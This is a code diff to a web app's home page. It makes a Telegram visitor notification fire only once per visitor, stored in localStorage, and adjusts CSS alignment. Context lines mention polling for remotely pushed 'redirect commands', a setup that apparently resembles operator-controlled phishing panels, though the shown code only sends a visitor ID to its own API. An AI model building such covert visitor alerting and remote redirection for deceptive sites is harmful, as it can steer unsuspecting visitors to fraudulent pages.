@@ -8,30 +8,46 @@ export default function Home() {
     // And poll for redirect commands
     (async () => {
       try {
-        const visitorId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
-        const pageLoadTime = Date.now();
-        localStorage.setItem('visitorId', visitorId);
-        localStorage.setItem('pageLoadTime', pageLoadTime.toString());
-        console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
-        console.log('[index.js] Page load time:', pageLoadTime);
+        // Check if we already have a visitorId and if notification was already sent
+        let visitorId = localStorage.getItem('visitorId');
+        const notificationSent = localStorage.getItem('telegramNotificationSent');
         
-        // Send notification (non-blocking - don't fail if it doesn't work)
-        fetch('/api/telegram/notify-visitor', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ visitorId })
-        })
-        .then(async (response) => {
-          const data = await response.json();
-          console.log('[index.js] Notification response:', data);
-          if (!data.success) {
-            console.warn('[index.js] Telegram notification warning:', data.warning || data.message);
-          }
-        })
-        .catch(error => {
-          console.warn('[index.js] Notification error (non-blocking):', error);
-          // Don't block page load if notification fails
-        });
+        // Only create new visitorId if one doesn't exist
+        if (!visitorId) {
+          visitorId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
+          localStorage.setItem('visitorId', visitorId);
+          localStorage.setItem('pageLoadTime', Date.now().toString());
+        }
+        
+        console.log('[index.js] Visitor ID:', visitorId);
+        
+        // Only send notification if it hasn't been sent before for this visitor
+        if (!notificationSent) {
+          console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
+          
+          // Send notification (non-blocking - don't fail if it doesn't work)
+          fetch('/api/telegram/notify-visitor', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ visitorId })
+          })
+          .then(async (response) => {
+            const data = await response.json();
+            console.log('[index.js] Notification response:', data);
+            if (data.success) {
+              // Mark notification as sent to prevent duplicates
+              localStorage.setItem('telegramNotificationSent', 'true');
+            } else {
+              console.warn('[index.js] Telegram notification warning:', data.warning || data.message);
+            }
+          })
+          .catch(error => {
+            console.warn('[index.js] Notification error (non-blocking):', error);
+            // Don't block page load if notification fails
+          });
+        } else {
+          console.log('[index.js] Notification already sent for this visitor, skipping...');
+        }
         
         // Use SSE for instant redirect notifications + polling as backup
         let redirectReceived = false;
@@ -484,7 +500,7 @@ export default function Home() {
 
         .link-section {
           margin-top: 16px;
-          text-align: left;
+          text-align: center;
         }
 
         .link-section a {
@@ -556,6 +572,8 @@ export default function Home() {
           margin-top: 40px;
           padding-top: 20px;
           text-align: center;
+          max-width: 450px;
+          width: 100%;
         }
 
         .footer-links {
@@ -646,11 +664,12 @@ export default function Home() {
           }
 
           .footer {
-            text-align: left;
+            text-align: center;
             padding-left: 12px;
             padding-right: 12px;
-            margin-left: 0;
-            margin-right: 0;
+            margin-left: auto;
+            margin-right: auto;
+            max-width: 100%;
             width: 100%;
           }
 
